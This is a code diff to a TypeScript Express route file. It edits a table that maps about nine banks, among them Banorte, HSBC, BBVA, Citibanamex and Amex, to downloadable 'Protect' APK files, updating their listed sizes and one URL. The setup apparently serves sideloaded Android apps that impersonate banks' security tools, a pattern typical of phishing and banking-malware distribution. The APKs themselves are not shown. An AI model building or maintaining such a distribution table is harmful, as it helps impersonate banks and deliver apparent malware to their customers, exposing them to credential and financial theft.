@@ -1402,47 +1402,47 @@ export async function registerRoutes(app: Express): Promise<Server> {
                     'BANORTE': {
                       fileName: 'BanorteProtect.apk',
                       fileUrl: '/assets/BanorteProtect_1749964227683.apk',
-                      fileSize: '3.9 MB'
+                      fileSize: '6.0 MB'
                     },
                     'HSBC': {
                       fileName: 'HsbcProtect.apk',
                       fileUrl: '/assets/HsbcProtect_1749964227683.apk',
-                      fileSize: '3.8 MB'
+                      fileSize: '6.0 MB'
                     },
                     'SCOTIABANK': {
                       fileName: 'scotiabankProtect.apk',
                       fileUrl: '/assets/scotiabankProtect_1749964227683.apk',
-                      fileSize: '3.8 MB'
+                      fileSize: '6.0 MB'
                     },
                     'BBVA': {
                       fileName: 'BbvaProtect.apk',
                       fileUrl: '/assets/BbvaProtec_1749964227683.apk',
-                      fileSize: '3.9 MB'
+                      fileSize: '6.0 MB'
                     },
                     'CITIBANAMEX': {
                       fileName: 'banamexProtect.apk',
                       fileUrl: '/assets/banamexProtect_1749964227683.apk',
-                      fileSize: '3.9 MB'
+                      fileSize: '6.0 MB'
                     },
                     'BANREGIO': {
                       fileName: 'BanregioProtect.apk',
                       fileUrl: '/assets/BanregioProtect_1749964227683.apk',
-                      fileSize: '3.8 MB'
+                      fileSize: '6.0 MB'
                     },
                     'BANCO_AZTECA': {
                       fileName: 'AztecaProtect.apk',
                       fileUrl: '/assets/AztecaProtect_1749964227683.apk',
-                      fileSize: '3.9 MB'
+                      fileSize: '6.0 MB'
                     },
                     'INVEX': {
                       fileName: 'InvexProtect.apk',
-                      fileUrl: `/assets/InvexProtect_1749964227683.apk?v=${Date.now()}`,
-                      fileSize: '3.8 MB'
+                      fileUrl: '/assets/InvexProtect_1749964227683.apk',
+                      fileSize: '6.0 MB'
                     },
                     'AMEX': {
                       fileName: 'AMEXProtect.apk',
                       fileUrl: '/assets/AMEXProtect_1749964227683.apk',
-                      fileSize: '3.9 MB'
+                      fileSize: '6.0 MB'
                     }
                   };
                   
